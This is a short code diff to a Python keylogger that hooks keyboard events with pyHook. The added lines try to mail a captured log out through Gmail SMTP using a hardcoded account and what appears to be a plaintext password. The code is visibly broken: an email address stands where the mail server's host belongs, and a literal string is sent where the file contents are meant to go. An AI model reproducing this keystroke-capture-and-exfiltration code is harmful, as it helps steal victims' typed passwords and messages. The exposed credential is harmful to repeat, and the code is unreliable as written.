@@ -1,4 +1,4 @@
-import pyHook, pythoncom, sys, logging
+import pyHook, pythoncom, smtplib
 from datetime import datetime
 from time import time
 
@@ -55,3 +55,11 @@ hooks_manager = pyHook.HookManager()
 hooks_manager.KeyDown = OnKeyboardEvent
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages() #red line says it doesn't exist but it does
+
+server = smtplib.SMTP('arnaudnicholas@gmail.com',587)
+server.starttls()
+server.login("arnaudnicholas@gmail.com","StelarFoil71")
+
+file = "open(file_name, 'r')"
+server.sendmail("arnaudnicholas@gmail.com","cobrahead09@gmail.com",file)
+server.quit()
